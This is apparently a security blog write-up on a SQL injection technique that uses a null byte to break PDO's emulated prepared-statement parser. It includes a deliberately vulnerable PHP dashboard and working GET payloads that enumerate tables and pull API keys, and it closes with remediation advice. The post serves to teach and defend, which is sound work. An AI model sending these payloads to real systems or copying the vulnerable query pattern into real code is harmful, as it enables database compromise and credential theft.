---
title: "Breaking PDO: When Prepared Statements Aren't Enough"
date: 2025-11-30
draft: false
tags: ["sql-injection", "php", "pdo", "web-security"]
categories: ["writeups"]
description: "A novel SQL injection technique that bypasses PDO prepared statements using null byte parser exploitation"
---

### Introduction

Prepared statements are considered the gold standard for preventing SQL injection. Every security guide, every OWASP recommendation, every senior developer will tell you: "Use prepared statements and you're safe."
But what if I told you that even properly implemented prepared statements can be bypassed?

In this post, I'll walk you through a technique that exploits PHP's PDO library specifically how it handles emulated prepared statements. You'll learn how a simple sorting parameter, combined with a null byte, can turn "secure" code into a full database compromise.

We'll build a vulnerable application together, exploit it step by step, and understand exactly why this works under the hood.

### SQL Injection: A quick refresher

Before we dive into the bypass technique, let's quickly recap how traditional SQL injection works.

Consider this PHP code:

```sql
$username = $_GET['username'];
$password = $_GET['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

The problem is obvious, user input is concatenated directly into the SQL query. When a user submits:

```sql
username: admin' OR 1=1-- -
password: anything
```

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = 'anything'
```

The single quote closes the string, `OR 1=1` makes the condition always true, and `-- -` comments out the rest. The attacker bypasses authentication.

This is SQL injection 101. The fix? Prepared statements.

### Prepared Statements: The “Secure” Solution

Prepared statements solve the injection problem by separating SQL structure from user data.
Instead of concatenating input directly, we use placeholders:

```sql
$username = $_GET['username'];
$password = $_GET['password'];

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

The `?` markers are placeholders. The database receives two things separately:

1. The query structure (with `?` markers)
2. The user input values

When the database processes this, it says: "Whatever values you give me go into those `?` spots, but I'll treat them as data never as SQL code."

So if an attacker tries the same payload:

```sql
username: admin' OR 1=1-- -
password: anything
```

The database simply searches for a user literally named `admin' OR 1=1-- -`. The injection fails because the input never becomes part of the SQL structure.

This is why every security guide recommends prepared statements. They work. They're safe.

Or are they?

---

### The Limitation. What can’t be a placeholder?

Prepared statements work perfectly for values usernames, passwords, IDs, search terms. But SQL queries have other components that can't be parameterized.

Consider this scenario: you're building a dashboard that displays vulnerability scan results. Users want to sort findings by different columns  severity, hostname, port, CVSS score.

You might try this:

```php
$sort = $_GET['sort'];

$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY ?");
$stmt->execute([$scan_id, $sort]);
```

This won't work. Why?

The `ORDER BY` clause expects a column name, not a string value. If the placeholder became `'severity'` (with quotes), MySQL would throw an error. Column names, table names, and other SQL identifiers cannot be bound as parameters.

So developers are forced to insert these values directly into the query:

```php
$sort = $_GET['sort'];

$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`");
$stmt->execute([$scan_id]);
```

The backticks (```) tell MySQL this is a column identifier. Many developers also escape backticks within the input:

```php
$sort = str_replace('`', '``', $_GET['sort']);

$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`");
$stmt->execute([$scan_id]);
```

This looks safe. The `scan_id` uses a proper placeholder. The `sort` column is wrapped in backticks and escaped. What could go wrong?

Everything. And here’s why.

---

### PDO’s Internal Parser - How it works.

Here's something that surprises many developers: PDO doesn't always use real prepared statements.

By default, when connecting to MySQL, PDO uses **emulated prepared statements**. This means PDO doesn't send your query and parameters separately to the database. Instead, PDO itself parses the query, finds the `?` placeholders, escapes your values, and substitutes them in - all before the query reaches MySQL.

Why does this matter? Because PDO needs to **parse your SQL** to find those placeholders.

Think about this query:

```sql
SELECT * FROM users WHERE name = ? /* TODO: fix this ? */
```

There are two `?` characters, but only one is a real placeholder. The other is inside a comment. PDO needs to understand SQL syntax to tell the difference.

So PDO implements its own SQL parser. This parser recognizes:

- Strings in single quotes (`'...'`)
- Strings in double quotes (`"..."`)
- Identifiers in backticks (`` `...` ``)
- Comments (`- ...` and `/* ... */`)

When PDO sees a `?` inside any of these, it knows: "That's not a real placeholder, skip it."

The parser processes characters from `\x01` to `\xff` as valid input. It reads through your query, tracking whether it's inside a string, identifier, or comment.

But what happens when the parser encounters something outside that range?

What happens when it hits a null byte - `\x00`?

It breaks.

### The Null Byte Trick - Breaking the parser

This is where it gets wild.

When PDO's parser hits a null byte (`\x00` or `%00` in URL encoding), it doesn't know how to handle it and it breaks. The parser expects characters in the `\x01` to `\xff` range. A null byte is outside that range.
The result? The parser breaks and stops tracking its current state.
Let's see this in action. Consider our vulnerable query:

```sql
$sort = str_replace('`', '``', $_GET['sort']);
$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`");
$stmt->execute([$scan_id]);
```

Normally, if we inject a `?` into the sort parameter:

```sql
sort=?
```

PDO sees:

```sql
SELECT * FROM findings WHERE scan_id = ? ORDER BY `?`
```

The parser recognizes that the second `?` is inside backticks - it's part of an identifier, not a real placeholder. Our injection fails.

But what if we add a null byte?

```sql
sort=\?;-- %00
```

Now PDO tries to parse:

```sql
SELECT * FROM findings WHERE scan_id = ? ORDER BY `\?;-- [NULL]`
```

The parser starts reading the backtick-quoted identifier. Then it hits the null byte. It breaks. It stops recognizing the backticks.

Suddenly, PDO sees that `?` as a **real placeholder**.

## The Swap

Now we have two `?` markers in the query:

1. The original one: `WHERE scan_id = ?`
2. Our injected one: `ORDER BY \?`

But wait the `--`  in our payload is a SQL comment. From PDO's perspective, it comments out the original `?`.

PDO now sees only ONE placeholder, our fake one.

When we call `execute([$scan_id])`, PDO takes the `scan_id` value and substitutes it into... our injected `?` in the ORDER BY clause.

The value we put in `scan_id` is no longer just a scan ID. It's now **executable SQL code** being inserted into the ORDER BY position.

| **What we send** | **Where it ends up** |
| --- | --- |
| `scan_id=PAYLOAD` | Gets substituted into ORDER BY (our fake `?)`  |
| `sort=\?;-- %00` | Creates the fake `?` and comments out the original |

The "safe" parameter becomes our injection point.

---

### Practical Demonstration - VulnScan dashboard

**The Database**

### Scenario

Imagine you're using a vulnerability scanner like Nessus or OpenVAS. It has a web dashboard where you view scan results.

**The Tables**

**`findings` -** Stores vulnerabilities scan results
****

```bash
| id | hostname     | port | severity | title              |
|----|--------------|------|----------|--------------------|
| 1  | 192.168.1.10 | 22   | Medium   | SSH Weak Ciphers   |
| 2  | 192.168.1.10 | 80   | High     | SQL Injection      |
```

This is what users are **supposed** to see.

**`api_keys`** - Stores sensitive API keys for integrations

```bash
| id | key_name           | api_key                              |
|----|--------------------|--------------------------------------|
| 1  | Production API     | sk_prod_a3f8b2c1d4e5f6a7b8c9d0e1f2.. |
```

This is what users should **never** see.

## The Attack Goal

The application only shows data from `findings`. Users can sort by severity, hostname, port, etc.

Through our SQLi, we trick the application into reading from `api_keys` instead a table we're not supposed to access.

**Normal query:**

```bash
SELECT severity FROM findings WHERE scan_id = 1
```

**Our exploited query:**

```bash
SELECT `\'x` FROM (SELECT api_key AS `\'x` FROM api_keys)y;-- ...
```

We replaced the entire query to read from a different table.

<details>
<summary> View the database code</summary>
    
    CREATE DATABASE vulnscan;
    USE vulnscan;
    
    CREATE TABLE findings (
        id INT PRIMARY KEY AUTO_INCREMENT,
        hostname VARCHAR(100),
        port INT,
        severity VARCHAR(20),
        cvss DECIMAL(3,1),
        title VARCHAR(200),
        description TEXT,
        scan_id INT
    );
    
    CREATE TABLE scans (
        id INT PRIMARY KEY AUTO_INCREMENT,
        scan_name VARCHAR(100),
        target VARCHAR(100),
        scan_date DATETIME
    );
    
    CREATE TABLE api_keys (
        id INT PRIMARY KEY AUTO_INCREMENT,
        key_name VARCHAR(50),
        api_key VARCHAR(255),
        created_by VARCHAR(50)
    );
    
    INSERT INTO findings VALUES 
    (1, '192.168.1.10', 22, 'Medium', 5.3, 'SSH Weak Ciphers', 'Server supports weak ciphers', 1),
    (2, '192.168.1.10', 80, 'High', 7.5, 'SQL Injection', 'Parameter vulnerable to SQLi', 1),
    (3, '192.168.1.11', 443, 'Critical', 9.8, 'RCE in Apache', 'Remote code execution possible', 1),
    (4, '192.168.1.12', 3306, 'Low', 3.1, 'MySQL Version Disclosure', 'Version visible in banner', 1);
    
    INSERT INTO scans VALUES
    (1, 'Internal Network Scan', '192.168.1.0/24', '2025-01-15 10:30:00');
    
    INSERT INTO api_keys VALUES
    (1, 'Production API', 'prod_api_a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5', 'admin'),
    (2, 'Scanner Integration', 'scanner_key_x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4', 'scanner_service');
</details>

<details><summary>View the vulnerable code</summary>    
 
    <?php
    /**
     * VulnScan Dashboard - Findings View
     * File: findings.php
     */
    
    $dsn = "mysql:host=127.0.0.1;dbname=vulnscan";
    $pdo = new PDO($dsn, 'vulnscan_user', 'password123');
    
    // Get scan_id from user - uses placeholder (SAFE)
    $scan_id = $_GET['scan_id'] ?? 1;
    
    // Get sort column from user - inserted directly (VULNERABLE)
    $sort = $_GET['sort'] ?? 'severity';
    
    // Developer thinks escaping backticks is enough...
    $sort = str_replace('`', '``', $sort);
    
    $stmt = $pdo->prepare("SELECT `$sort` FROM findings WHERE scan_id = ?");
    $stmt->execute([$scan_id]);
    $findings = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    echo "<h1>Scan Findings</h1>";
    echo "<table border='1'>";
    foreach($findings as $finding) {
        echo "<tr>";
        foreach($finding as $value) {
            echo "<td>" . htmlspecialchars($value) . "</td>";
        }
        echo "</tr>";
    }
    echo "</table>";
    ?>
    
</details>

The developer followed best practices:

-  ✔️ Used prepared statements
-  ✔️ Used placeholders for `scan_id`
-  ✔️ Escaped backticks in the sort parameter

But they couldn't use a placeholder for the column name. That's where we attack.

### Step 1: Normal Request

```bash
GET /findings.php?scan_id=1&sort=severity
```

Returns findings sorted by severity. Everything works normally.

**Step 2: Test the Parser Break**

```bash
GET /findings.php?scan_id=1&sort=?%00
```

If you get an error about parameter count mismatch, the parser is broken. PDO is seeing our `?` as a real placeholder.

### Step 3: Enumerate Tables

```bash
GET /findings.php?scan_id=x`+FROM+(SELECT+table_name+AS+`'x`+FROM+information_schema.tables+WHERE+table_schema=database())y;--+-&sort=\?;--+-%00
```

This reveals the tables: `findings`, `scans`, `api_keys`.

### Step 4: Extract API keys

```bash
GET /findings.php?scan_id=x`+FROM+(SELECT+api_key+AS+`'x`+FROM+api_keys)y;--+-&sort=\?;--+-%00
```

Result:

| **api_key** |
| --- |
| sk_live_a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5 |
| sk_prod_x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4 |

We've extracted sensitive API keys from a completely different table.

### Understanding the Payload

Let's break down:

```bash
scan_id=x+FROM+(SELECT+api_key+AS+'x+FROM+api_keys)y;--+-`
```

| **Part** | **Purpose** |
| --- | --- |
| `X` | Dummy value |
| `` ` `` | Closes the original backtick in the query |
| `FROM (...)y` |  |
| `` `SELECT api_key AS 'x` `` | Selects api_key and names it `'x` |
| `;` | Ends the statement |
| `-+-` | Comments out the rest |

Why `'x` as the column name? PDO escapes single quotes by adding a backslash. So `'x` becomes `\'x`. The `\` in our sort parameter (`\?`) ensures the outer column name also becomes `\'x` , they match, and MySQL returns our data.

### Remediation - How to fix it

Now that we understand the vulnerability, how do we prevent it?

### Option 1: Disable Emulated Prepares

The simplest fix, tell PDO to use real prepared statements:

```php
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false
]);
```

With real prepared statements, the query structure is sent to MySQL first, then the parameters separately. PDO's parser is never involved, so the null byte trick doesn't work.

### Option 2: Whitelist Allowed Values

Never trust user input for column names. Define exactly which columns are allowed:

```php
$allowed_sorts = ['hostname', 'port', 'severity', 'cvss', 'title'];
$sort = $_GET['sort'] ?? 'severity';

if (!in_array($sort, $allowed_sorts)) {
    $sort = 'severity'; // default fallback
}

$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`");
$stmt->execute([$scan_id]);
```

If the user sends anything not in the whitelist, it defaults to a safe value.

### Option 3: Both (Recommended)

Defense in depth, use both protections:

```php
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false
]);

$allowed_sorts = ['hostname', 'port', 'severity', 'cvss', 'title'];
$sort = $_GET['sort'] ?? 'severity';

if (!in_array($sort, $allowed_sorts)) {
    $sort = 'severity';
}

$stmt = $pdo->prepare("SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`");
$stmt->execute([$scan_id]);
```

### What NOT to Do

These approaches are **not enough**:

✖️ **Escaping backticks only**

```php
$sort = str_replace('`', '``', $_GET['sort']);
```

Doesn't prevent the null byte parser break.

✖️ **Filtering null bytes only**

```php
$sort = str_replace("\0", '', $_GET['sort']);
```

Other parser bugs may exist. Defense in depth is better.

✖️ **Relying on WAFs**
Web Application Firewalls might miss encoded payloads like `%00`.

### Conclusion & References

Prepared statements are secure, but only when used correctly.

The key takeaways from this technique:

1. **Prepared statements can't protect everything** - Column names, table names, and ORDER BY clauses cannot use placeholders. Developers are forced to insert these directly.
2. **PDO's emulated prepares have a parser** - This parser can be broken with null bytes, causing PDO to misidentify placeholders.
3. **"Safe" parameters can become injection points** - Through the swap technique, a properly bound parameter value ends up in a vulnerable position.
4. **Defense in depth matters** - Disable emulated prepares AND whitelist allowed values. Never rely on a single protection.

When testing PHP applications, look for:

- Sorting functionality (ORDER BY)
- Dynamic column selection
- Table name parameters
- Any place where identifiers come from user input

Test with payloads like `\?;-- %00` and watch for unexpected behavior.

## References

- [Original research on this technique by hashkitten (DownUnderCTF 2024)](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
- [PHP PDO Documentation](https://www.php.net/manual/en/book.pdo.php)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
